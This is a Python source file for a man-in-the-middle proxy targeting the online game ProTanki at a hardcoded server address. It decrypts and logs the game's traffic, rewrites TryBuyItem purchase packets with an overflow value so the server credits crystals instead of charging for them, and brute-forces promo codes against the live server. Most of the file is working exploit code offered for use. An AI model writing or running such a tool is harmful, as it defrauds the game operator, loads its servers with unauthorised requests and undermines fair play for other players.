"""
ProTanki bare-bones MITM proxy with optional TryBuyItem overflow injection.

Usage:
  python proxy.py [--listen-host 0.0.0.0] [--listen-port 25565]
                  [--server-host 146.59.110.146] [--server-port 25565]
                  [--upstream-bind-ip <your real NIC IP>]
                  [--inject-gain N]   # crystals to gain per purchase (0 = off)

What it does:
  - Intercepts TCP between client and server.
  - Performs cipher key exchange (same XOR cipher as the real proxy).
  - Decrypts and logs every packet in both directions.
  - When --inject-gain N is set: intercepts TryBuyItem, replaces count with
    an overflow value so the server credits N crystals instead of debiting.
  - Writes a JSONL log to logs/traffic_<timestamp>.jsonl.
"""
from __future__ import annotations

import argparse
import datetime as dt
import json
import os
import socket
import struct
import threading
import zlib
from typing import List, Optional, Set, Tuple

from cipher import ProTankiCipher, _NOP
from inject import TRY_BUY_ITEM_PID, patch_try_buy_item, build_cs_frame, MODES
from promo_stress import (
    DEFAULT_ALPHABET,
    PROMO_FAIL_ACK_PID,
    PROMO_REQUEST_PID,
    PromoEvent,
    PromoStressEngine,
)

# ─── Packet ID registry ───────────────────────────────────────────────────────

KEY_EXCHANGE_ID = 2001736388    # S→C: XOR key vector (plaintext)
CRYSTAL_ID      = -593513288    # S→C: crystal balance update
FUND_ID         = 1149211509    # S→C: battle fund change

PROMO_REQUEST_ID = PROMO_REQUEST_PID
PROMO_FAIL_ACK_ID = PROMO_FAIL_ACK_PID

NAMES = {
    KEY_EXCHANGE_ID:   "key_exchange",
    CRYSTAL_ID:        "crystal_update",
    FUND_ID:           "fund_update",
    PROMO_REQUEST_ID:  "promo_request",
    PROMO_FAIL_ACK_ID: "promo_fail_ack",
    -1864333717:       "locale",
    1831462385:        "bonus_spawn",
    -1047185003:       "pickup_request",
    -1291499147:       "pickup_confirm",
    -2026749922:       "bonus_remove",
    329279865:         "movement",
    -1683279062:       "movement_ext",
    1927704181:        "enemy_turret",
    1516578027:        "enemy_move",
    -114968993:        "fire",
    -1672577397:       "tank_spec_update",
    2092412133:        "battle_select",
    -1315002220:       "join_spectator",
    -2135234426:       "battle_create",
    -1284211503:       "team_join",
    -64696933:         "physics_correction",
    1484572481:        "ping",
}

MAX_FRAME = 4_000_000


# ─── Logger ───────────────────────────────────────────────────────────────────

class Logger:
    def __init__(self, path: Optional[str]) -> None:
        if path:
            os.makedirs(os.path.dirname(os.path.abspath(path)), exist_ok=True)
        self._path = path
        self._lock = threading.Lock()

    def log(self, event: str, **kw) -> None:
        ts = dt.datetime.now(dt.timezone.utc).isoformat()
        row = {"ts": ts[11:23], "event": event, **kw}
        kw_str = "  ".join(f"{k}={v}" for k, v in kw.items())
        print(f"[{ts[11:23]}] {event:<26s} {kw_str}")
        line = json.dumps(row, ensure_ascii=False)
        if self._path:
            with self._lock:
                with open(self._path, "a", encoding="utf-8") as f:
                    f.write(line + "\n")


# ─── Frame parsing ────────────────────────────────────────────────────────────

def _pull_frames(buf: bytearray) -> List[Tuple[int, bytes, bool]]:
    """Pull complete frames from buf (modified in place)."""
    out: List[Tuple[int, bytes, bool]] = []
    while True:
        if len(buf) < 8:
            break
        hw = struct.unpack_from(">I", buf, 0)[0]
        compressed = bool(hw >> 24 & 0x40)
        total_len = hw & 0xFFFFFF
        if total_len < 8 or total_len > MAX_FRAME:
            del buf[:4]
            continue
        if len(buf) < total_len:
            break
        pid = struct.unpack_from(">i", buf, 4)[0]
        payload_enc = bytes(buf[8:total_len])
        del buf[:total_len]
        out.append((pid, payload_enc, compressed))
    return out


def _decode_vector_byte(payload: bytes) -> List[int]:
    """VectorCodecByte: 4-byte BE count + count bytes."""
    if len(payload) < 4:
        return []
    count = struct.unpack_from(">i", payload, 0)[0]
    if count < 0 or 4 + count > len(payload):
        return []
    return list(payload[4: 4 + count])


def _decrypt(payload_enc: bytes, compressed: bool, cipher: object) -> bytes:
    plain = cipher.decrypt_sc(payload_enc)  # type: ignore[attr-defined]
    if compressed:
        try:
            plain = zlib.decompress(plain)
        except Exception:
            pass
    return plain


# ─── Session state ────────────────────────────────────────────────────────────

class Session:
    def __init__(self) -> None:
        # SC direction (server→client): one cipher instance, lock-protected
        # because _fwd_sc and _fwd_cs run in separate threads.
        self._sc_cipher: object = _NOP
        self._sc_lock = threading.Lock()

        # CS direction (client→server): TWO separate cipher instances,
        # both accessed only from _fwd_cs (single thread, no lock needed).
        #   _cs_log    — tracks client's send state, used for logging
        #   _cs_server — tracks our send state to server, used for injection/re-encryption
        self._cs_log: object    = _NOP
        self._cs_server: object = _NOP

        self.cipher_active: bool = False
        self.active: bool = True
        self.promo: Optional[PromoStressEngine] = None

    def activate(self, key_vec: List[int]) -> None:
        with self._sc_lock:
            # SC cipher and both CS ciphers start from the same key.
            # SC uses recv_key/recv_pos; CS instances use send_key/send_pos.
            # Two separate ProTankiCipher objects for CS so they can diverge
            # independently after an inject modifies a payload.
            self._sc_cipher = ProTankiCipher(key_vec)
            self._cs_log    = ProTankiCipher(key_vec)
            self._cs_server = ProTankiCipher(key_vec)
            self.cipher_active = True

    def decrypt_sc(self, data: bytes, compressed: bool) -> bytes:
        """Decrypt a server→client payload. Thread-safe."""
        with self._sc_lock:
            plain = self._sc_cipher.decrypt_sc(data)  # type: ignore[attr-defined]
        if compressed:
            try:
                plain = zlib.decompress(plain)
            except Exception:
                pass
        return plain

    def cs_log_decrypt(self, payload_enc: bytes) -> bytes:
        """
        Decrypt a client→server payload with the log cipher.
        Returns raw bytes after XOR (still zlib-compressed if the frame was compressed).
        Call only from _fwd_cs thread.
        """
        return self._cs_log.decrypt_cs(payload_enc)  # type: ignore[attr-defined]

    def cs_server_encrypt(self, data: bytes) -> bytes:
        """
        Re-encrypt plaintext (or compressed payload) for the server.
        Call only from _fwd_cs thread.
        """
        return self._cs_server.encrypt_cs(data)  # type: ignore[attr-defined]


# ─── Forwarding ───────────────────────────────────────────────────────────────

def _hex_preview(data: bytes, max_bytes: int = 64) -> Optional[str]:
    if not data:
        return None
    h = data[:max_bytes].hex()
    return h if len(data) <= max_bytes else h + "..."


def _parse_pid_list(raw: str) -> Set[int]:
    out: Set[int] = set()
    for part in raw.split(","):
        token = part.strip()
        if not token:
            continue
        try:
            out.add(int(token))
        except ValueError as exc:
            raise ValueError(f"Invalid PID value: {token!r}") from exc
    return out


def _log_promo_events(log: Logger, events: List[PromoEvent]) -> None:
    for evt in events:
        log.log(
            evt.event,
            code=evt.code,
            reason=evt.reason,
            checked_total=evt.checked_total,
            success_total=evt.success_total,
            failed_total=evt.failed_total,
        )


def _fwd_sc(srv: socket.socket, cli: socket.socket,
            sess: Session, log: Logger) -> None:
    """Server → Client: decrypt, log, forward."""
    buf = bytearray()
    raw_buf = bytearray()

    def flush():
        if raw_buf:
            try:
                cli.sendall(bytes(raw_buf))
            except OSError:
                pass
            raw_buf.clear()

    try:
        while sess.active:
            try:
                chunk = srv.recv(65536)
            except socket.timeout:
                if sess.promo is not None:
                    _log_promo_events(log, sess.promo.poll())
                continue
            if not chunk:
                break
            raw_buf.extend(chunk)
            buf.extend(chunk)

            for pid, payload_enc, compressed in _pull_frames(buf):
                name = NAMES.get(pid, "unknown")

                # Key exchange — plaintext, no cipher yet
                if pid == KEY_EXCHANGE_ID and not sess.cipher_active:
                    key_vec = _decode_vector_byte(payload_enc)
                    sess.activate(key_vec)
                    log.log("cipher_init", key_bytes=len(key_vec))
                    flush()
                    continue

                if not sess.cipher_active:
                    flush()
                    continue

                plain = sess.decrypt_sc(payload_enc, compressed)
                if sess.promo is not None:
                    _log_promo_events(log, sess.promo.handle_sc_packet(pid, plain))

                # Crystal balance — highlight it
                if pid == CRYSTAL_ID and len(plain) >= 4:
                    balance = struct.unpack_from(">i", plain, 0)[0]
                    log.log("CRYSTAL_UPDATE", pid=pid, balance=balance,
                            payload_len=len(plain), hex=plain.hex())

                elif pid == FUND_ID and len(plain) >= 4:
                    fund = struct.unpack_from(">i", plain, 0)[0]
                    log.log("sc_packet", pid=pid, name=name,
                            fund=fund, payload_len=len(plain))

                else:
                    log.log("sc_packet", pid=pid, name=name,
                            payload_len=len(plain), compressed=compressed,
                            hex=_hex_preview(plain))

            flush()
    except (OSError, ConnectionResetError):
        pass
    finally:
        try:
            cli.shutdown(socket.SHUT_WR)
        except OSError:
            pass


def _fwd_cs(cli: socket.socket, srv: socket.socket,
            sess: Session, log: Logger,
            inject_mode: str = '', inject_gain: int = 1000) -> None:
    """
    Client -> Server forwarding with optional TryBuyItem overflow injection.

    When inject_gain == 0: forward raw bytes, decrypt only for logging.
    When inject_gain  > 0: decrypt every frame, optionally patch TryBuyItem,
                           re-encrypt with a separate server-side cipher, forward.

    Two independent CS cipher instances in Session keep log state and server
    state consistent even when a payload is modified.
    """
    buf = bytearray()   # persistent reassembly buffer

    def maybe_send_promo() -> bool:
        if sess.promo is None or not sess.cipher_active:
            return True

        _log_promo_events(log, sess.promo.poll())
        next_req = sess.promo.try_next_request()
        if next_req is None:
            return True

        code, promo_plain = next_req
        promo_enc = sess.cs_server_encrypt(promo_plain)
        promo_frame = build_cs_frame(PROMO_REQUEST_ID, promo_enc, compressed=False)
        try:
            srv.sendall(promo_frame)
        except OSError:
            return False

        log.log("promo_send", pid=PROMO_REQUEST_ID, code=code, code_len=len(code))
        return True

    try:
        while sess.active:
            try:
                chunk = cli.recv(65536)
            except socket.timeout:
                if not maybe_send_promo():
                    break
                continue
            if not chunk:
                break

            if not sess.cipher_active:
                # Pre-cipher: forward raw (locale packet etc.)
                try:
                    srv.sendall(chunk)
                except OSError:
                    break
                continue

            buf.extend(chunk)
            out_frames = bytearray()

            for pid, payload_enc, compressed in _pull_frames(buf):
                name = NAMES.get(pid, "unknown")

                # --- Decrypt with log cipher (tracks client's send state) ---
                raw = sess.cs_log_decrypt(payload_enc)
                # raw is post-XOR bytes; still zlib-compressed if compressed=True
                plain = raw
                if compressed:
                    try:
                        plain = zlib.decompress(raw)
                    except Exception:
                        pass

                log.log("cs_packet", pid=pid, name=name,
                        payload_len=len(plain), compressed=compressed,
                        hex=_hex_preview(plain, 32))

                # --- Inject: patch TryBuyItem if mode is configured ---
                inject_raw = raw   # what we'll re-encrypt for the server
                if inject_mode and pid == TRY_BUY_ITEM_PID and not compressed:
                    result = patch_try_buy_item(plain, inject_mode, inject_gain)
                    if result is not None:
                        inject_raw, info = result
                        log.log("INJECT", **info)

                # --- Re-encrypt with server cipher, build frame ---
                new_enc = sess.cs_server_encrypt(inject_raw)
                out_frames.extend(build_cs_frame(pid, new_enc, compressed))

            if out_frames:
                try:
                    srv.sendall(bytes(out_frames))
                except OSError:
                    break
            if not maybe_send_promo():
                break

    except (OSError, ConnectionResetError):
        pass
    finally:
        try:
            srv.shutdown(socket.SHUT_WR)
        except OSError:
            pass


# ─── Accept loop ──────────────────────────────────────────────────────────────

def _handle(cli_sock: socket.socket, cli_addr: Tuple[str, int],
            server_host: str, server_port: int,
            upstream_bind_ip: Optional[str], log: Logger,
            inject_mode: str = '', inject_gain: int = 1000,
            promo_enabled: bool = False,
            promo_min_len: int = 1,
            promo_max_len: int = 50,
            promo_alphabet: str = DEFAULT_ALPHABET,
            promo_interval_ms: int = 2000,
            promo_fail_timeout_ms: int = 2500,
            promo_ack_grace_ms: int = 250,
            promo_success_pids: Optional[Set[int]] = None,
            promo_fail_pids: Optional[Set[int]] = None,
            promo_output_dir: str = "logs") -> None:
    log.log("client_connected", addr=f"{cli_addr[0]}:{cli_addr[1]}")
    src = (upstream_bind_ip, 0) if upstream_bind_ip else None
    try:
        srv = socket.create_connection((server_host, server_port), timeout=10,
                                       source_address=src)
        srv.settimeout(1.0)
        cli_sock.settimeout(1.0)
        log.log("upstream_connected", upstream=f"{server_host}:{server_port}")
    except OSError as e:
        log.log("upstream_error", error=str(e))
        cli_sock.close()
        return

    sess = Session()
    if promo_enabled:
        promo_dir = os.path.join(os.path.dirname(__file__), promo_output_dir)
        try:
            sess.promo = PromoStressEngine(
                promo_dir,
                min_len=promo_min_len,
                max_len=promo_max_len,
                alphabet=promo_alphabet,
                interval_ms=promo_interval_ms,
                fail_timeout_ms=promo_fail_timeout_ms,
                ack_grace_ms=promo_ack_grace_ms,
                success_pids=sorted(promo_success_pids or []),
                fail_pids=sorted(promo_fail_pids or []),
            )
            snap = sess.promo.snapshot()
            log.log(
                "promo_stress_ready",
                min_len=snap["min_len"],
                max_len=snap["max_len"],
                alphabet_len=snap["alphabet_len"],
                checked_total=snap["checked_total"],
                success_total=snap["success_total"],
                failed_total=snap["failed_total"],
                cursor=snap["cursor"],
                output_dir=snap["output_dir"],
            )
        except ValueError as e:
            log.log("promo_stress_error", error=str(e))
            sess.promo = None

    t_sc = threading.Thread(target=_fwd_sc, args=(srv, cli_sock, sess, log), daemon=True)
    t_cs = threading.Thread(target=_fwd_cs, args=(cli_sock, srv, sess, log, inject_mode, inject_gain), daemon=True)
    t_sc.start()
    t_cs.start()

    try:
        while t_sc.is_alive() and t_cs.is_alive():
            t_sc.join(timeout=0.2)
            t_cs.join(timeout=0.2)
    finally:
        sess.active = False
        for s in (srv, cli_sock):
            try:
                s.shutdown(socket.SHUT_RDWR)
            except OSError:
                pass
        t_sc.join(timeout=1.5)
        t_cs.join(timeout=1.5)
        srv.close()
        cli_sock.close()
        log.log("session_ended", addr=f"{cli_addr[0]}:{cli_addr[1]}")


def main() -> None:
    ap = argparse.ArgumentParser(description="ProTanki bare-bones MITM proxy")
    ap.add_argument("--listen-host",      default="0.0.0.0")
    ap.add_argument("--listen-port",      type=int, default=25565)
    ap.add_argument("--server-host",      default="146.59.110.146")
    ap.add_argument("--server-port",      type=int, default=25565)
    ap.add_argument("--upstream-bind-ip", default=None,
                    help="Local NIC IP to use for outgoing connection to server "
                         "(required when listening on a loopback alias)")
    ap.add_argument("--inject-mode",  default='', choices=list(MODES) + [''],
                    help="Injection mode (empty = observe only): " + ', '.join(MODES))
    ap.add_argument("--inject-gain",  type=int, default=1000,
                    help="Desired crystal gain for modes that use it (default 1000)")
    ap.add_argument("--promo-stress", action="store_true",
                    help="Enable promo-code stress generator")
    ap.add_argument("--promo-min-len", type=int, default=1,
                    help="Minimum generated promo length (default 1)")
    ap.add_argument("--promo-max-len", type=int, default=50,
                    help="Maximum generated promo length (default 50)")
    ap.add_argument("--promo-alphabet", default=DEFAULT_ALPHABET,
                    help="Alphabet for generated promo codes (default 0-9A-Z)")
    ap.add_argument("--promo-interval-ms", type=int, default=2000,
                    help="Delay between promo sends in milliseconds")
    ap.add_argument("--promo-fail-timeout-ms", type=int, default=2500,
                    help="Timeout after send before marking code as failed")
    ap.add_argument("--promo-ack-grace-ms", type=int, default=250,
                    help="Grace delay after fail ACK before finalizing failure")
    ap.add_argument("--promo-success-pids", default="",
                    help="Comma-separated SC packet IDs treated as success")
    ap.add_argument("--promo-fail-pids", default=str(PROMO_FAIL_ACK_ID),
                    help="Comma-separated SC packet IDs treated as failure")
    ap.add_argument("--promo-output-dir", default="logs",
                    help="Directory (relative to script) for promo result files")
    ap.add_argument("--no-traffic-log", action="store_true",
                    help="Disable traffic_*.jsonl file logging")
    ap.add_argument("--log-dir",      default="logs")
    args = ap.parse_args()

    if args.promo_min_len < 1:
        ap.error("--promo-min-len must be >= 1")
    if args.promo_max_len < args.promo_min_len:
        ap.error("--promo-max-len must be >= --promo-min-len")

    try:
        promo_success_pids = _parse_pid_list(args.promo_success_pids)
        promo_fail_pids = _parse_pid_list(args.promo_fail_pids)
    except ValueError as e:
        ap.error(str(e))

    ts = dt.datetime.now().strftime("%Y%m%d_%H%M%S")
    log_path: Optional[str] = None
    if not args.no_traffic_log:
        log_path = os.path.join(os.path.dirname(__file__), args.log_dir, f"traffic_{ts}.jsonl")
    log = Logger(log_path)

    srv_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv_sock.bind((args.listen_host, args.listen_port))
    srv_sock.listen(5)
    log.log("proxy_started",
            listen=f"{args.listen_host}:{args.listen_port}",
            upstream=f"{args.server_host}:{args.server_port}",
            upstream_bind=args.upstream_bind_ip or "auto",
            inject_mode=args.inject_mode or "off",
            inject_gain=args.inject_gain,
            promo_stress=args.promo_stress,
            promo_min_len=args.promo_min_len if args.promo_stress else 0,
            promo_max_len=args.promo_max_len if args.promo_stress else 0,
            promo_interval_ms=args.promo_interval_ms if args.promo_stress else 0,
            promo_output_dir=args.promo_output_dir if args.promo_stress else "",
            traffic_log_enabled=(not args.no_traffic_log),
            log=log_path or "disabled")

    try:
        while True:
            cli_sock, cli_addr = srv_sock.accept()
            t = threading.Thread(
                target=_handle,
                args=(cli_sock, cli_addr, args.server_host, args.server_port,
                      args.upstream_bind_ip, log, args.inject_mode, args.inject_gain,
                      args.promo_stress, args.promo_min_len, args.promo_max_len,
                      args.promo_alphabet, args.promo_interval_ms,
                      args.promo_fail_timeout_ms, args.promo_ack_grace_ms,
                      promo_success_pids, promo_fail_pids, args.promo_output_dir),
                daemon=True,
            )
            t.start()
    except KeyboardInterrupt:
        log.log("proxy_stopped")
    finally:
        srv_sock.close()


if __name__ == "__main__":
    main()
